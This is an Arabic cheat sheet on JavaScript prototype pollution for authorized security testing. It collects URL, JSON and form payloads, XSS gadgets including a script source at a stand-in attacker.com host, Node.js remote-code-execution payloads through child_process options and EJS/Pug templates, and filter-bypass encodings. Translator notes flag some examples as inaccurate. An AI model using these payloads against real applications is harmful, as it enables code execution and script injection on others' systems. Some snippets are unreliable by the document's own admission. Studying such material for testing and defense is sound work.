<a id="-prototype-pollution-cheatsheet"></a>
# 🧬 ورقة مرجعية لتلوث النماذج الأولية (Prototype Pollution)

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ██████╗ ██████╗  ██████╗ ████████╗ ██████╗ ████████╗██╗   ██╗██████╗ ███████╗
  ██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝██╔═══██╗╚══██╔══╝╚██╗ ██╔╝██╔══██╗██╔════╝
  ██████╔╝██████╔╝██║   ██║   ██║   ██║   ██║   ██║    ╚████╔╝ ██████╔╝█████╗  
  ██╔═══╝ ██╔══██╗██║   ██║   ██║   ██║   ██║   ██║     ╚██╔╝  ██╔═══╝ ██╔══╝  
  ██║     ██║  ██║╚██████╔╝   ██║   ╚██████╔╝   ██║      ██║   ██║     ███████╗
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝    ╚═╝      ╚═╝   ╚═╝     ╚══════╝
                 ██████╗  ██████╗ ██╗     ██╗     ██╗   ██╗████████╗██╗ ██████╗ ███╗   ██╗
                 ██╔══██╗██╔═══██╗██║     ██║     ██║   ██║╚══██╔══╝██║██╔═══██╗████╗  ██║
                 ██████╔╝██║   ██║██║     ██║     ██║   ██║   ██║   ██║██║   ██║██╔██╗ ██║
                 ██╔═══╝ ██║   ██║██║     ██║     ██║   ██║   ██║   ██║██║   ██║██║╚██╗██║
                 ██║     ╚██████╔╝███████╗███████╗╚██████╔╝   ██║   ██║╚██████╔╝██║ ╚████║
                 ╚═╝      ╚═════╝ ╚══════╝╚══════╝ ╚═════╝    ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

يعرض الشعار مصطلح Prototype Pollution، أي تلوث النماذج الأولية في JavaScript.

---

<a id="-what-is-prototype-pollution"></a>
## 🎯 ما هو تلوث النماذج الأولية؟

**تلوث النماذج الأولية (Prototype Pollution)** فئة ثغرات في JavaScript تتيح لمدخلات يتحكم فيها المهاجم تعديل خصائص في سلسلة النماذج الأولية، مثل `Object.prototype`، وقد تؤثر في سلوك كائنات التطبيق التي ترث منها.

<a id="impact"></a>
### الأثر
- 🔴 **XSS** — التلاعب بمعالجة DOM
- 🔴 **تنفيذ شيفرة عن بُعد (RCE)** — من جهة الخادم في Node.js عند وجود مسار استغلال مناسب
- 🔴 **تجاوز** — ضوابط الأمان
- 🔴 **حجب الخدمة (DoS)** — تعطل التطبيق

---

<a id="-javascript-prototypes"></a>
## 🔍 النماذج الأولية في JavaScript ‏(Prototypes)

<a id="how-it-works"></a>
### كيف تعمل الآلية؟

> **تصحيح للتعميم:** ليست كل الكائنات مرتبطة بـ `Object.prototype`؛ فالكائنات ذات النموذج الأولي `null` لا ترث منه، وقد تحجب خاصية مملوكة للكائن خاصية موروثة بالاسم نفسه. [شرح MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution).
```javascript
// كل كائن يرث من Object.prototype بحسب تعميم الأصل؛ راجع التوضيح
let obj = {};
obj.__proto__ === Object.prototype  // true

// إذا عدلنا النموذج الأولي:
Object.prototype.polluted = "hacked";

// تتأثر الكائنات بحسب وصف الأصل؛ راجع حدود الوراثة
let newObj = {};
console.log(newObj.polluted);  // "hacked"
```

<a id="dangerous-properties"></a>
### خصائص حساسة
```javascript
__proto__
constructor
prototype
```

---

<a id="-client-side-payloads"></a>
## 💉 مدخلات اختبار جهة العميل (Payloads)

<a id="via-url-queryhash"></a>
### عبر URL في الاستعلام أو الجزء بعد #
```
# صيغة أساسية
?__proto__[polluted]=value
?__proto__.polluted=value

# خاصية constructor
?constructor[prototype][polluted]=value

# صيغة متداخلة
?__proto__[__proto__][polluted]=value

# مرمزة بصيغة URL
?__proto__%5Bpolluted%5D=value
```

<a id="via-json"></a>
### عبر JSON

> **توضيح:** وجود `__proto__` في JSON وفك ترميزه لا يلوث النموذج الأولي وحده؛ يلزم مسار كتابة أو دمج غير آمن. كما يختلف معناه في JSON عن دوره الخاص في صيغة إنشاء كائن JavaScript. [مرجع MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution).
```javascript
// مدخلات المستخدم
{"__proto__": {"polluted": "value"}}
{"constructor": {"prototype": {"polluted": "value"}}}

// صيغة متداخلة
{"a": {"__proto__": {"polluted": "value"}}}
```

<a id="via-form-data"></a>
### عبر بيانات النموذج
```html
<input name="__proto__[polluted]" value="hacked">
<input name="constructor[prototype][polluted]" value="hacked">
```

---

<a id="-exploitation-examples"></a>
## 🔥 أمثلة اختبار الاستغلال

تعرض المقاطع صيغ إدخال وشيفرات جزئية، وليست كلها JavaScript قابلًا للتنفيذ كما يوحي تمييز الكتل. يلزم وجود محلل مدخلات يسبب التلوث ومسار يستخدم الخاصية الملوثة حتى تتحقق النتيجة. [منهج PortSwigger لاكتشاف المصادر والمسارات](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution).

<a id="dom-xss-via-innerhtml"></a>
### ثغرة DOM XSS عبر innerHTML
```javascript
// إذا كانت الشيفرة تنفذ ما يلي:
element.innerHTML = obj.html || "";

// مدخل تلوث النموذج الأولي:
?__proto__[html]=<img src=x onerror=alert(1)>

// النتيجة بحسب الأصل: XSS عند تحقق المتطلبات
```

<a id="script-src-gadget"></a>
### مسار استغلال (Gadget) يستخدم src لعنصر script
```javascript
// إذا كانت الشيفرة تنفذ ما يلي:
let script = document.createElement('script');
script.src = obj.src || '/default.js';

// مدخل تلوث النموذج الأولي:
?__proto__[src]=data:,alert(1)//
?__proto__[src]=//attacker.com/evil.js
```

<a id="dom-clobbering-combo"></a>
### الدمج مع التلاعب بأسماء DOM ‏(DOM Clobbering) بحسب الأصل
```javascript
// أنماط خصائص قد تدخل في مسارات استغلال
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[outerHTML]=<img src=x onerror=alert(1)>
?__proto__[srcdoc]=<script>alert(1)</script>
```

<a id="jquery-gadgets"></a>
### مسارات استغلال تتعلق بـ jQuery
```javascript
// jQuery < 3.4.0
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))

// مدخل اختبار الاستغلال
?__proto__[url]=javascript:alert(1)
```

---

<a id="-server-side-nodejs"></a>
## 🖥️ جهة الخادم باستخدام Node.js

> **توافق الأمثلة:** مقاطع RCE التالية ليست استغلالات مكتملة أو صالحة لكل إصدار؛ يلزم مصدر تلوث فعلي، ومسار يستخدم الخصائص الموروثة، ومتطلبات مناسبة للمكتبة وبيئة Node.js. مجرد إرسال JSON لا ينفذ الأوامر المعروضة. [مرجع خيارات child_process الرسمي](https://nodejs.org/api/child_process.html).

<a id="rce-via-child_process"></a>
### تنفيذ شيفرة عن بُعد عبر child_process بحسب الأصل
```javascript
// إذا استخدم التطبيق spawn أو exec مع كائن خيارات:
const { spawn } = require('child_process');
spawn('ls', [], options);

// مدخل تلوث النموذج الأولي:
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(1)"}}

// أو:
{"__proto__": {"shell": true, "env": {"NODE_OPTIONS": "--require /tmp/pwn.js"}}}
```

<a id="rce-via-require"></a>
### تنفيذ شيفرة عن بُعد عبر require() بحسب الأصل
```javascript
// مدخل اختبار تلوث النموذج الأولي
{"__proto__": {"main": "./pwned.js"}}
```

<a id="ejs-template-rce"></a>
### مثال تنفيذ شيفرة عبر قوالب EJS
```javascript
// EJS (< 3.1.7) RCE
{"__proto__": {
    "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');x"
}}
```

<a id="pug-template-rce"></a>
### مثال تنفيذ شيفرة عبر قوالب Pug
```javascript
// تنفيذ شيفرة عبر Pug بحسب الأصل
{"__proto__": {
    "block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync('id')"
    }
}}
```

---

<a id="-detection"></a>
## 🔍 الكشف

<a id="manual-testing"></a>
### الاختبار اليدوي

> **تصحيح مهم:** تعيين `Object.prototype.testPollution` مباشرة في وحدة التحكم يثبت أثر الوراثة فقط؛ لا يثبت أن مدخلات المستخدم تستطيع تلويث التطبيق. يلزم تتبع مدخل قابل للتحكم إلى كتابة غير آمنة بدل اعتبار التعليق «vulnerable» حكمًا نهائيًا. [شرح آلية التلوث لدى MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution).
```javascript
// في وحدة تحكم المتصفح:
Object.prototype.testPollution = "polluted";
let obj = {};
console.log(obj.testPollution);  // إذا ظهرت "polluted" فالأصل يصفها بثغرة؛ راجع التصحيح

// إزالة التعديل التجريبي
delete Object.prototype.testPollution;
```

<a id="url-testing"></a>
### الاختبار عبر URL
```
# إضافة القيمة إلى URL ثم الفحص في وحدة التحكم
?__proto__[test]=polluted

// في وحدة التحكم:
({}).test  // يفترض الأصل undefined، ويعد "polluted" مؤشرًا؛ راجع التوضيح
```

<a id="find-gadgets-dom-invader"></a>
### البحث عن مسارات الاستغلال باستخدام DOM Invader
```
1. جهز DOM Invader ضمن Burp Suite
2. فعّل نمط اختبار تلوث النماذج الأولية
3. تصفح التطبيق
4. افحص مواضع استخدام البيانات الحساسة (Sinks) القابلة للاستغلال
```

---

<a id="-tools"></a>
## 🛠️ الأدوات

|الأداة|الغرض|
|------|---------|
|**DOM Invader**|أداة ضمن بيئة Burp للكشف عن تلوث النماذج الأولية|
|**ppfuzz**|اختبار تلوث النماذج الأولية بمدخلات متنوعة|
|**ppmap**|البحث عن مسارات استغلال|
|**PPScan**|أداة فحص جهة العميل|

<a id="ppmap-usage"></a>
### استخدام ppmap
```bash
# التثبيت
git clone https://github.com/nickvdyck/ppmap
cd ppmap

# الفحص
node ppmap.js https://target.com
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="payload-formats"></a>
### صيغ مدخلات الاختبار

> **توضيح:** قد يغير `Object.assign({},input)` النموذج الأولي للكائن الناتج عند وجود خاصية `__proto__` مناسبة، لكنه لا يعدّل `Object.prototype` العام بالضرورة. احتُفظ بالصيغة الأصلية. [تفصيل MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution).
|الصيغة|مدخل الاختبار|
|--------|---------|
|الاستعلام|`?__proto__[x]=y`|
|الجزء بعد # في URL|`#__proto__[x]=y`|
|JSON|`{"__proto__":{"x":"y"}}`|
|الدمج|`Object.assign({},input)`|

<a id="common-gadgets"></a>
### خصائص شائعة في مسارات الاستغلال
|الخاصية|الأثر|
|----------|--------|
|`innerHTML`|XSS|
|`src`|حقن برامج نصية|
|`href`|إعادة توجيه|
|`shell`|تنفيذ شيفرة عن بُعد في Node.js|
|`env`|تنفيذ شيفرة عن بُعد في Node.js|

<a id="bypass-techniques"></a>
### تقنيات تجاوز التحقق

> **قراءة للصيغة الأصلية:** التعبير `["__proto__"]["polluted"] = "value"` ينشئ مصفوفة ثم يكتب خاصية فيها؛ لا يعادل بحد ذاته الوصول إلى `Object.prototype`. أُبقي دون تعديل لتوثيق عدم دقة المثال.
```javascript
// إذا رُشحت __proto__:
constructor.prototype.polluted = "value"

// صيغة تدوين مختلفة بحسب الأصل
["__proto__"]["polluted"] = "value"

// ترميز Unicode
{"\u005f\u005fproto\u005f\u005f": {"x": "y"}}
```

---

<a id="-resources"></a>
## 📚 الموارد

- [دليل PortSwigger لتلوث النماذج الأولية](https://portswigger.net/web-security/prototype-pollution)
- [تلوث النماذج الأولية من جهة الخادم](https://portswigger.net/research/server-side-prototype-pollution)
- [أداة فحص تلوث النماذج الأولية في جهة العميل](https://github.com/nickvdyck/ppmap)

---

<p align="center">
  <b>🧬 افهم واختبر تلوث النماذج الأولية!</b><br>
  <i>للاختبارات المصرح بها فقط!</i>
</p>
